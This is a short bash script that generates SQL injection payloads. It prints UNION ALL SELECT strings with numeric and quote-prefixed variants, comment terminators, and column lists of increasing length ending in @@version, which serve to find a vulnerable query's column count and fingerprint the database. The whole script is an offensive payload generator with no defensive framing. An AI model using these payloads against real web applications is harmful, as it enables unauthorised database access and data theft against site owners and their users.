#!/bin/bash

read -p "Enter the rows number " number

echo "-500 union all select @@version "
echo "-500 union all select @@version # "
echo "-500 union all select @@version -- - "
echo "-500 union all select 1 "
echo "-500 union all select 1 # "
echo "-500 union all select 1 -- - "


echo "-500' union all select @@version "
echo "-500' union all select @@version # "
echo "-500' union all select @@version -- - "
echo "-500' union all select 1 "
echo "-500' union all select 1 # "
echo "-500' union all select 1 -- - "

for i in `seq 1 $number`
do 
	str=""
	for j in `seq 1 $i`
	do
		str=$str"$j, "
		echo "-500 union all select $str @@version "
		echo "-500 union all select $str @@version # "
		echo "-500 union all select $str @@version -- - "

		echo "-500' union all select $str @@version "
		echo "-500' union all select $str @@version # "
		echo "-500' union all select $str @@version -- - "
		
	done	

done
